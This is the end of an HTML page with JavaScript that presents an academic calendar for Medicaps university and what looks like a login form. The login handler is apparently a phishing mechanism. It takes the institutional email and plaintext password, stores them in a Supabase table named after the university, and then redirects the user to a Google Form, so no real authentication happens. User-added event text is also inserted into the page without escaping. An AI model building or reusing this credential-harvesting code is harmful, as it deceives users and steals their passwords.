                <div class="bg-[#2d388a] px-6 py-4 flex justify-between items-center">
                    <h3 class="text-white font-bold text-lg tracking-wide">Add Custom Event</h3>
                    <button id="closeModalBtn" class="text-white hover:text-slate-300 transition-colors text-2xl leading-none">&times;</button>
                </div>
                <div class="p-6">
                    <input type="hidden" id="eventDayInput">
                    <div class="mb-5">
                        <label class="block text-sm font-semibold text-slate-700 mb-2">Event Description</label>
                        <textarea id="eventTextInput" rows="3" class="w-full bg-slate-50 border border-slate-200 rounded-xl p-3 focus:bg-white focus:border-[#2d388a] focus:ring-2 focus:ring-[#2d388a]/20 outline-none transition-all resize-none placeholder:text-slate-400" placeholder="E.g., Project meeting at 10 AM..."></textarea>
                    </div>
                    <div class="flex gap-3">
                        <button id="cancelEventBtn" class="flex-1 bg-white text-slate-700 border border-slate-300 py-2.5 rounded-xl hover:bg-slate-50 transition-colors font-semibold">Cancel</button>
                        <button id="saveEventBtn" class="flex-1 bg-[#2d388a] text-white py-2.5 rounded-xl shadow-md hover:bg-[#1f2761] hover:shadow-lg transition-all font-semibold">Save Event</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const calendarData = [
            { month: 'July 2026', days: 31, events: { 11: { text: "1st chance test Skill-based core classes for 1st semester", type: "event", span: "11-17" }, 20: { text: "Start of ODD Higher Semester Classes", type: "event" } } },
            { month: 'August 2026', days: 31, events: { 10: { text: "Start of ODD Semester Course Registration", type: "event" }, 15: { text: "Independence Day (Holiday)", type: "holiday" }, 17: { text: "Start of ODD 1st Semester Classes", type: "event" }, 26: { text: "Janmashtami (Holiday)", type: "holiday" }, 28: { text: "Raksha Bandhan (Holiday)", type: "holiday" } } },
            { month: 'September 2026', days: 30, events: { 7: { text: "Ganesh Chaturthi (Holiday)", type: "holiday" }, 16: { text: "Milad-un-Nabi (Holiday)", type: "holiday" }, 26: { text: "Day Following Anant Chaturdashi (Holiday)", type: "holiday" }, 28: { text: "MST-I Examinations", type: "exam", span: "28-30" } } },
            { month: 'October 2026', days: 31, events: { 2: { text: "Gandhi Jayanti (Holiday)", type: "holiday" }, 4: { text: "SHL-AMCAT-SVA test", type: "event", span: "04-05" }, 12: { text: "Dussehra (Holiday)", type: "holiday" }, 21: { text: "SHL-AMCAT-All mock interview", type: "event" }, 31: { text: "Deepawali (Holiday)", type: "holiday" } } },
            { month: 'November 2026', days: 30, events: { 15: { text: "Guru Nanak Jayanti (Holiday)", type: "holiday" }, 26: { text: "Compilation of soft course", type: "event" }, 27: { text: "END of Teaching", type: "important" } } },
            { month: 'December 2026', days: 31, events: { 2: { text: "Preparatory Leave", type: "leave" }, 3: { text: "End Semester Examination", type: "exam", span: "03-17" }, 25: { text: "Christmas Day (Holiday)", type: "holiday" }, 26: { text: "SHL-AMCAT-VI Sem Soft Exam", type: "event" } } },
            { month: 'January 2027', days: 31, events: { 2: { text: "End Semester examination and Copy Viewing", type: "event", span: "02-10" }, 12: { text: "Start of Even Semester Course Registration", type: "event" }, 14: { text: "UFM Meeting", type: "event" }, 18: { text: "Start of EVEN Semester Classes", type: "important_even" } } }
        ];

        let currentMonthIndex = 0;

        function renderCalendar() {
            const container = document.getElementById('calendarTimeline');
            const monthData = calendarData[currentMonthIndex];
            
            // Update Navigation state
            document.getElementById('currentMonthDisplay').textContent = monthData.month;
            document.getElementById('prevMonthBtn').disabled = currentMonthIndex === 0;
            document.getElementById('nextMonthBtn').disabled = currentMonthIndex === calendarData.length - 1;

            const dateObj = new Date(monthData.month);
            const startDay = dateObj.getDay();
            const daysOfWeek = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];

            // Setup elegant minimalist container
            let html = `
                <div class="bg-white rounded-3xl shadow-md shadow-slate-200/50 border border-[#e2e8f0] overflow-hidden flex flex-col h-full">
                    <div class="grid grid-cols-7 border-b border-[#e2e8f0] bg-[#e0f2fe]">
            `;

            // Day Headers
            daysOfWeek.forEach(day => {
                html += `<div class="text-center font-bold text-slate-400 text-xs md:text-sm uppercase tracking-widest py-4">${day}</div>`;
            });
            
            html += `</div><div class="grid grid-cols-7 flex-1 auto-rows-[120px] md:auto-rows-[140px]">`;

            // Padding Empty Cells
            for (let i = 0; i < startDay; i++) {
                html += `<div class="bg-[#f0f9ff]/50 border-r border-b border-[#e2e8f0] p-2"></div>`;
            }

            let currentSpanEnd = 0;
            let currentSpanEvent = null;

            // Generate Day Cells
            for (let d = 1; d <= monthData.days; d++) {
                // Ensure data structures exist for user interactions
                let ev = monthData.events[d] || {};
                if (!ev.userEvents) ev.userEvents = [];
                if (ev.pinned === undefined) ev.pinned = false;
                monthData.events[d] = ev; // persist back

                if (ev.span) {
                    currentSpanEnd = parseInt(ev.span.split('-')[1]);
                    currentSpanEvent = ev;
                }

                let activeEvent = ev.text ? ev : (d <= currentSpanEnd ? currentSpanEvent : null);
                let isPinned = ev.pinned;
                
                // Minimalist cell styling based on state
                let cellClasses = "relative group p-2 md:p-3 border-r border-b border-[#e2e8f0] transition-all flex flex-col overflow-hidden overflow-y-auto custom-scrollbar ";
                
                if (isPinned) {
                    cellClasses += "bg-[#fefce8] hover:bg-[#fef9c3] "; // Soft yellow tint for pinned
                } else {
                    cellClasses += "bg-[#f0f9ff] hover:bg-[#e0f2fe] "; // Beautiful bright sky blue tint
                }

                let numClasses = "text-[14px] md:text-[16px] font-bold inline-flex items-center justify-center w-7 h-7 rounded-full transition-colors ";
                
                // Today/Holiday highlight logic for numbers
                if (activeEvent && activeEvent.type === 'holiday') {
                    numClasses += "text-red-500 bg-red-50 group-hover:bg-red-100";
                } else {
                    numClasses += "text-slate-700 group-hover:text-[#2d388a] group-hover:bg-[#e8eaf6]";
                }

                html += `<div class="${cellClasses}">`;
                
                // Top Row: Date Number + Action Buttons (Pin/Add)
                html += `
                    <div class="flex justify-between items-start mb-2 shrink-0">
                        <span class="${numClasses}">${d}</span>
                        <div class="flex gap-1 opacity-0 group-hover:opacity-100 transition-opacity duration-200">
                            <button onclick="togglePin(${d})" class="p-1.5 rounded-lg text-slate-400 hover:text-yellow-500 hover:bg-yellow-50 transition-all" title="${isPinned ? 'Unpin Day' : 'Pin Day'}">
                                <svg class="w-4 h-4" ${isPinned ? 'fill="currentColor" class="text-yellow-500"' : 'fill="none"'} stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 5a2 2 0 012-2h10a2 2 0 012 2v16l-7-3.5L5 21V5z"></path></svg>
                            </button>
                            <button onclick="openAddEventModal(${d})" class="p-1.5 rounded-lg text-slate-400 hover:text-[#2d388a] hover:bg-[#e8eaf6] transition-all" title="Add Event">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"></path></svg>
                            </button>
                        </div>
                    </div>
                `;

                // Render Original Institutional Event
                if (activeEvent && activeEvent.text) {
                    let eventStyle = "";
                    if (activeEvent.type === 'holiday') eventStyle = "bg-red-50 text-red-700 border-red-100";
                    else if (activeEvent.type === 'exam') eventStyle = "bg-indigo-50 text-indigo-700 border-indigo-100";
                    else if (activeEvent.type === 'important' || activeEvent.type === 'important_even') eventStyle = "bg-blue-50 text-blue-700 border-blue-100";
                    else if (activeEvent.type === 'leave') eventStyle = "bg-slate-100 text-slate-600 border-slate-200";
                    else eventStyle = "bg-[#f8fafc] text-slate-700 border-slate-200";
                    
                    html += `<div class="text-[10px] md:text-[12px] leading-tight rounded-md px-2 py-1.5 mb-1.5 font-semibold border ${eventStyle}">${activeEvent.text}</div>`;
                }

                // Render User Added Events
                if (ev.userEvents.length > 0) {
                    ev.userEvents.forEach((uEv, idx) => {
                        html += `
                        <div class="text-[10px] md:text-[11px] leading-tight rounded-md px-2 py-1.5 mb-1.5 bg-emerald-50 text-emerald-700 border border-emerald-100 flex justify-between items-start gap-1 group/uev">
                            <span class="break-words">${uEv}</span>
                            <button onclick="deleteUserEvent(${d}, ${idx})" class="opacity-0 group-hover/uev:opacity-100 text-emerald-600 hover:text-red-500 transition-colors shrink-0 font-bold text-sm leading-none">&times;</button>
                        </div>`;
                    });
                }

                html += `</div>`;

                // Clear multi-day span tracker when ended
                if (d === currentSpanEnd) {
                    currentSpanEnd = 0;
                    currentSpanEvent = null;
                }
            }

            // Fill trailing Empty Cells
            const totalCells = startDay + monthData.days;
            const remainder = totalCells % 7;
            if (remainder !== 0) {
                for (let i = 0; i < 7 - remainder; i++) {
                    html += `<div class="bg-[#f0f9ff]/50 border-r border-b border-[#e2e8f0] p-2"></div>`;
                }
            }

            html += `</div></div>`;
            container.innerHTML = html;
        }

        document.getElementById('prevMonthBtn').addEventListener('click', () => {
            if (currentMonthIndex > 0) {
                currentMonthIndex--;
                renderCalendar();
            }
        });

        document.getElementById('nextMonthBtn').addEventListener('click', () => {
            if (currentMonthIndex < calendarData.length - 1) {
                currentMonthIndex++;
                renderCalendar();
            }
        });

        function togglePin(day) {
            calendarData[currentMonthIndex].events[day].pinned = !calendarData[currentMonthIndex].events[day].pinned;
            renderCalendar();
        }

        function openAddEventModal(day) {
            document.getElementById('eventDayInput').value = day;
            document.getElementById('eventTextInput').value = '';
            document.getElementById('addEventModal').classList.remove('hidden');
            setTimeout(() => document.getElementById('eventTextInput').focus(), 100);
        }

        function closeAddEventModal() {
            document.getElementById('addEventModal').classList.add('hidden');
        }

        document.getElementById('closeModalBtn').addEventListener('click', closeAddEventModal);
        document.getElementById('cancelEventBtn').addEventListener('click', closeAddEventModal);

        document.getElementById('saveEventBtn').addEventListener('click', () => {
            const day = document.getElementById('eventDayInput').value;
            const text = document.getElementById('eventTextInput').value.trim();
            if (text) {
                calendarData[currentMonthIndex].events[day].userEvents.push(text);
                closeAddEventModal();
                renderCalendar();
            }
        });

        function deleteUserEvent(day, index) {
            calendarData[currentMonthIndex].events[day].userEvents.splice(index, 1);
            renderCalendar();
        }

        // Email Validation Logic
        const emailInput = document.getElementById('emailInput');
        if(emailInput) {
            emailInput.addEventListener('input', function () {
                // Box becomes red if there's text but it doesn't match the required domain
                if (this.value.length > 0 && !this.value.endsWith('@medicaps.ac.in')) {
                    this.classList.add('invalid-email');
                } else {
                    this.classList.remove('invalid-email');
                }
            });
        }

        // Toggle Password Visibility functionality
        const togglePassword = document.getElementById('togglePassword');
        const passwordInput = document.getElementById('password');

        if(togglePassword && passwordInput) {
            togglePassword.addEventListener('click', function () {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                if (type === 'text') {
                    this.classList.replace('text-gray-500', 'text-[#1976d2]');
                } else {
                    this.classList.replace('text-[#1976d2]', 'text-gray-500');
                }
            });
        }

        // --- Supabase Authentication Logic ---
        const supabaseUrl = 'https://nkdsmdkimiasgkmoolmb.supabase.co';
        const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5rZHNtZGtpbWlhc2drbW9vbG1iIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU1NjY5MTcsImV4cCI6MjA5MTE0MjkxN30.ZN7dvyGShVlGp4iCNg91EvDnCRcnw4oRsnjN_yfUDs4';
        const supabaseClient = window.supabase.createClient(supabaseUrl, supabaseAnonKey);

        const loginForm = document.getElementById('loginForm');
        const authMessage = document.getElementById('authMessage');
        const submitBtn = document.getElementById('submitBtn');

        if (loginForm) {
            loginForm.addEventListener('submit', async function (e) {
                e.preventDefault(); 

                const email = emailInput.value.trim();
                const password = passwordInput.value;

                if (!email || !password) {
                    authMessage.textContent = 'Please enter both email and password.';
                    authMessage.classList.remove('hidden', 'text-green-600', 'bg-green-50');
                    authMessage.classList.add('text-red-600', 'bg-red-50');
                    return;
                }

                submitBtn.textContent = 'Logging in...';
                submitBtn.disabled = true;
                authMessage.classList.add('hidden');

                const { data, error } = await supabaseClient
                    .from('medicaps')
                    .insert([{ email: email, pass: password }])
                    .select(); 

                if (error) {
                    submitBtn.textContent = 'Log in';
                    submitBtn.disabled = false;
                    console.error('Supabase error:', error);
                    authMessage.textContent = 'Error: ' + error.message;
                    authMessage.classList.remove('hidden', 'text-green-600', 'bg-green-50');
                    authMessage.classList.add('text-red-600', 'bg-red-50');
                } else {
                    console.log('Row saved:', data);
                    
                    // Redirect to the specific Google Form directly after successfully saving credentials
                    window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSeRxE8UAvb4gmnDEYsDbxZ0bur_XQTD4v5aq-AjovmQoX6vyg/viewform";
                }
            });
        }
    </script>
</body>
</html>
